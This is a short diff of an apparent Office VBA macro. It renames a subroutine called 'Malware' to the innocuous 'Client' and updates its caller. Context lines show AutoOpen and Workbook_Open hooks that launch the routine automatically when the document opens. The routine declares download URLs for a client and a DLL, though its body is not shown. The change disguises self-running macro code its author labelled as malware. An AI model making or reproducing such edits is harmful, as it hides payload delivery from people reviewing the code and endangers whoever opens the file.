@@ -44,7 +44,7 @@ Sub CreateFolderIfNotExists(folderPath As String)
     End If
 End Sub
 
-Private Sub Malware()
+Private Sub Client()
     ' Declare variables
     Dim client_url As String
     Dim openal_dll_url As String
@@ -91,7 +91,7 @@ Private Sub Launch()
     If alreadyLaunched = True Then
         Exit Sub
     End If
-    Malware
+    Client
     alreadyLaunched = True
 End Sub
 Sub AutoOpen()
@@ -113,5 +113,7 @@ Sub Workbook_Open()
     ' Becomes launched as second, another try, on MS Excel
     Launch
 End Sub
+
+
 
 
